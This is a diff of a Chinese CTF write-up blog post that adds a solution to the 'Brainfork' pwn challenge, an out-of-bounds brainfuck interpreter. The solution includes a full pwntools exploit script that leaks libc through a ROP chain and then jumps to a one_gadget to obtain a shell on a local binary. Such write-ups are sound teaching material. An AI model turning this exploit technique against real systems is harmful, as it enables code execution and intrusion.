@@ -32,11 +32,11 @@ mathjax: true
   - [ ] MMMc
   - [x] Way
   - [ ] ~~pe_format~~ 没放出来的题
-- [ ] Pwn
+- [x] Pwn
   - [x] ssp
   - [x] fmt
   - [x] armRop
-  - [ ] Brainfork
+  - [x] Brainfork
 - [ ] Blockchain
 - [ ] Web
 - [ ] Crypto （~~我要是会数论昨天的蓝桥杯就不至于心态崩了~~）
@@ -44,6 +44,12 @@ mathjax: true
 === Update On 2022-04-19 ===
 
 被隔离了....，没有什么事要干，补了`armRop`这题
+
+=== Update On 2022-04-29 ===
+
+明天有一场`DawgCTF`，于是今天就补了`Brainfork`这题（~~并没有关联~~）
+
+
 
 ## MISC
 
@@ -783,9 +789,198 @@ p.interactive()
 
 
 
-### Brainfork [TODO]
+### Brainfork
+
+这是一道`brainfuck`的解释器，漏洞在于数据指针没有对边界进行限制，于是可以修改任意地址
+
+![brain1](brain1.png)
+
+首先`checksec`发现没有`canary`但是有`PIE`，所以我们总体利用的思路是：
+
+1. 泄漏`__libc_start_main`的地址（刚好有`puts`）
+2. 想办法重入`main`
+3. 跳转到`one_gadgets`找到的地址`getshell`
+
+首先，经过一些简单的测试，不难发现我们将数据指针右移`0x104`次可以到达返回地址（需要注意的是，这个数据指针是`16`位的）
+
+然后，考虑我们劫持后的栈结构：
+
+```
+                  +-------------+
+return address -> | POP RDI RET |
+                  +-------------+
+                  |     RDI     | -> libc_start_main_got
+                  +-------------+
+                  |    RET 1    | -> puts
+                  +-------------+
+                  |    RET 2    | -> main
+                  +-------------+
+```
+
+需要注意的是，我们需要给地址增加偏移量(`PIE`)，我们不妨复制原来的返回地址，然后计算偏移量并加上
+
+在`BrainFuck`中，我们可以通过类似于下述的结构来复制数据
+
+```
+[->+>+<<]>>[-<<+>>]<<
+```
+
+在第二次重入后，我们需要将返回地址重定向到`one_gadget`找到的地址
+
+由于`libc`中的地址一般都是`0x7ff`开头的高地址，直接加上去会超过`65535`的指令条数限制，所以我们需要一种算法来生成高效的`BrainFuck`代码：[Brainfuck constants - Esolang (esolangs.org)](https://esolangs.org/wiki/Brainfuck_constants)
+
+由于出题人没有提供远程环境，所以我们在本地实验一下即可：
+
+![brain2](brain2.png)
+
+```python
+#!/usr/bin/env python3
+
+from functools import cache
+from pwn import *
+
+exe = ELF("brainfork_patched")
+libc = ELF("libc-2.27.so")
+ld = ELF("ld-2.27.so")
+
+context.binary = exe
 
 
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.GDB:
+            gdb.attach(r)
+        elif args.IDA:
+            from pwnlib.util.proc import wait_for_debugger
+            wait_for_debugger(r.pid)
+    else:
+        r = remote("127.0.0.1", 10045)
+
+    return r
+
+
+def minimize(payload: bytes):
+    payload = payload.replace(b'.', b'')
+    back = payload
+    while True:
+        payload = payload.replace(b'<>', b'')
+        payload = payload.replace(b'><', b'')
+        if payload == back:
+            return back
+        back = payload
+
+
+space = 64 // 16
+minus_to_zero = b'[-]'
+copy_16 = b'[-' + b'>' * space + b'+' + b'>' * space + b'+' \
+    + b'<' * (space * 2) + b']' + b'>' * (space * 2) \
+    + b'[-' + b'<' * (space * 2) + b'+' + b'>' * \
+    (space * 2) + b']' + b'<' * (space * 2)
+
+
+@cache
+def num2bf(x: int):
+    x = str(hex(x))[2:]
+    gadget1 = '[>++++++++++++++++<-]>'
+    gadget2 = '[<++++++++++++++++>-]<'
+    rev = True
+    ans = ''
+    for a in x:
+        cnt = int(a, 16)
+        ans += '+' * cnt
+        ans += gadget1 if rev else gadget2
+        rev = not rev
+    return ans[:-len(gadget1)]
+
+
+def ll2bf(num: int):
+    ans = []
+    space = 64 // 16
+    for _ in range(space):
+        n = num & 0xffff
+        num >>= 16
+        ans.append(num2bf(n))
+    st = ''
+    st += '>' * (space - 1)
+    for i in range(space):
+        st += ans[space - i - 1]
+        st += '<<'
+    return st[:-2]
+
+
+def leak_libc(r):
+    puts_plt = 0x1030
+
+    libc_start_main_got = 0x3fe0
+    main_addr = 0x1599
+    main_return = main_addr + 0x31  # 0x15ca
+    pop_rdi_ret = 0x165b
+
+    '''
+                      +-------------+
+    return address -> | POP RDI RET |
+                      +-------------+
+                      |     RDI     | -> libc_start_main
+                      +-------------+
+                      |    RET 1    | -> puts
+                      +-------------+
+                      |    RET 2    | -> main
+                      +-------------+
+    '''
+
+    payload = b'>' * 0x104
+    payload += b'+' * (pop_rdi_ret - main_return)  # pop rdi ret
+
+    payload += b'>' * space
+    payload += (minus_to_zero + b'>') * (space * 4)  # set zero
+
+    payload += b'<' * (space * 5)
+    payload += (copy_16 + b'>') * (space * 3)  # copy RDI, RET 1, RET 2
+    payload += b'-' * (pop_rdi_ret - main_addr)  # RET 2 = main
+    payload += b'<' * space
+    payload += b'-' * (pop_rdi_ret - puts_plt)  # RET 1 = puts
+    payload += b'<' * space
+    payload += b'+' * (libc_start_main_got - pop_rdi_ret) # RDI = libc_start_main
+    payload += b'..'
+
+    r.sendline(minimize(payload))
+    libc_start_main = u64(r.recv(6).ljust(8, b'\x00'))
+    log.info('libc_start_main: ' + hex(libc_start_main))
+    return libc_start_main
+
+
+def getshell(r, libc_start_main):
+    one_gadget = 0x4f365
+    libc_offset = libc_start_main - libc.symbols['__libc_start_main']
+    target = one_gadget + libc_offset
+    log.info('target: ' + hex(target))
+
+    payload = b'>' * 0x104
+    payload += (minus_to_zero + b'>') * space
+    payload += b'<' * space
+    payload += bytes(ll2bf(target), 'ascii')
+    # payload = minimize(payload)
+
+    log.info(f'payload length: 0x{hex(len(payload))}')
+    if len(payload) >= 0xFFFF:
+        raise 'payload too long'
+
+    r.sendline(payload)
+
+
+def main():
+    r = conn()
+    libc_start_main = leak_libc(r)
+    input('getshell')
+    getshell(r, libc_start_main)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
+```
 
 
 
